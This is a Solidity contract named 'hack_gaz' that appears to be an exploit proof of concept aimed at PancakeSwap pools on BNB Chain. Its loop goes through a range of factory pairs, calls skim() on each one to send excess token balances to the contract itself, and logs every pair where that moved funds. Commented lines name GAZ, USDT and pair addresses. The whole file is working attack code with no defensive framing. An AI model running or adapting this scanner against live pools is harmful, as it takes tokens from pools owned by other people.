// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;


import "./IERC20.sol";
import "./console.sol";
import "./IUniswapV2pair.sol";


// interface IDigitalDeal{
//     function gazPrice() external view returns(uint256);
//     function deposit(uint256 _amount, address _recommend) external;
//     function participate(uint256 _warehouse, uint256 _round, uint256 _amount) external returns (bool);
//     function selfaward(uint256 _warehouse, uint256 _round) external;
//     function blasting(uint256 _warehouse, uint256 _round) external;
//     function backstrack(uint256 _warehouse, uint256 _round) external;
//     function withdrawusdt(uint256 _amount) external;
//     function approve(address guy) external returns (bool);
//     function transferFrom(address src, address dst, uint256 wad) external returns (bool);
// }
interface IPancakeFactory {
    event PairCreated(address indexed token0, address indexed token1, address pair, uint);

    function feeTo() external view returns (address);
    function feeToSetter() external view returns (address);

    function getPair(address tokenA, address tokenB) external view returns (address pair);
    function allPairs(uint) external view returns (address pair);
    function allPairsLength() external view returns (uint);

    function createPair(address tokenA, address tokenB) external returns (address pair);

    function setFeeTo(address) external;
    function setFeeToSetter(address) external;
}


contract hack_gaz{
    // address public constant gaz_token = 0x6C7EB9B9668746c280EB5e5Bd8D415CaBE7030a9;
    // address public constant usdt_gaz_pair = 0x6b3bb9b5eDa829050Ca0c02201b13E71BDD73a8D;
    // address public constant usdt = 0x55d398326f99059fF775485246999027B3197955;
    address public constant factory_address = 0xcA143Ce32Fe78f1f7019d7d551a6402fC5350c73;
    address public pair_address;

    function check_reserve() public {

        for(uint i = 984; i < 2000; i++){
            pair_address = IPancakeFactory(factory_address).allPairs(i);

            (uint256 reserve0, uint256 reserve1, ) = UniswapV2Pair(pair_address).getReserves();
            // console.log("1xxxxxx reserve0 and reserve1 : ", reserve0, reserve1);
            console.log("num: ", i);
            UniswapV2Pair(pair_address).skim(address(this));
            
            (uint256 r0, uint256 r1, ) = UniswapV2Pair(pair_address).getReserves();
            // console.log("2xxxxxx reserve0 and reserve1 : ", r0, r1);

            if(r0 != reserve0 || r1 != reserve1){
                console.log("nice pair!!!", pair_address);
            }
        }
        console.log("done check!!");
        
    }

    receive() external payable{}
}